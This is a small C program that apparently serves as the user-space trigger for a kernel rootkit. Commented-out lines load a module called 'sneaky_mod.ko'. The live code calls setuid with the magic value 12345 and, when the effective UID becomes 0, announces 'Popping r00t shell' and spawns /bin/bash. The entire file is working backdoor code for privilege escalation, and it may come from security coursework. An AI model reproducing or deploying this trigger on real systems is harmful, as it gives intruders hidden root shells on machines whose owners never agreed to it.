#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>   

int main(){
  /* int sneaky_pid = getpid(); */
  /* char parameter[200]; */
  /* sprintf(parameter, "insmod ./sneaky_mod.ko sneaky_pid=%d\n", sneaky_pid); */
  /* printf("parameter is : %s\n", parameter); */
  /* system(parameter); */


  setuid(12345);
  uid_t ID;
  uid_t EID;
  ID = getuid();
  EID = geteuid();
  printf("[+] UID = %hu\n[+] EUID = %hu\n",ID,EID);
  
  if (EID == 0){
    printf("[!!!] Popping r00t shell!!!\n");
    system("/bin/bash");
  }
  return EXIT_SUCCESS;
  
}
